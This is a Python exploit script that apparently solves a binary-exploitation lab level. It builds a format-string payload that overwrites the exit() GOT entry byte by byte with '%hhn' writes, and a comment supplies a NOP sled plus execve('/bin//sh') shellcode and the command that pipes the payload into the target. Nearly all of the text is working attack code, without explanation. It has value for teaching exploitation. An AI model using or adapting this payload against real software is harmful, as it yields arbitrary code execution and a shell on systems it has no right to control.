import struct

def p(x):
    return struct.pack("<I", x)

# export SHELLCODE=`python -c 'print "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
# (cat /vagrant/payload; cat) | fixenv /levels/lab04/lab4B

GOT_EXIT = 0x080499b8
ENV_PAYLOAD = 0xbffff548

payload = ""
payload += p(GOT_EXIT + 3)
payload += p(0xDEADBEEF)
payload += p(GOT_EXIT + 2)
payload += p(0xDEADBEEF)
payload += p(GOT_EXIT + 1)
payload += p(0xDEADBEEF)
payload += p(GOT_EXIT)
payload += "%128x"
payload += "%p" * 4
payload += "%hhn"
payload += "%64x"
payload += "%hhn"
payload += "%246x"
payload += "%hhn"
payload += "%99x"
payload += "%hhn"

print payload
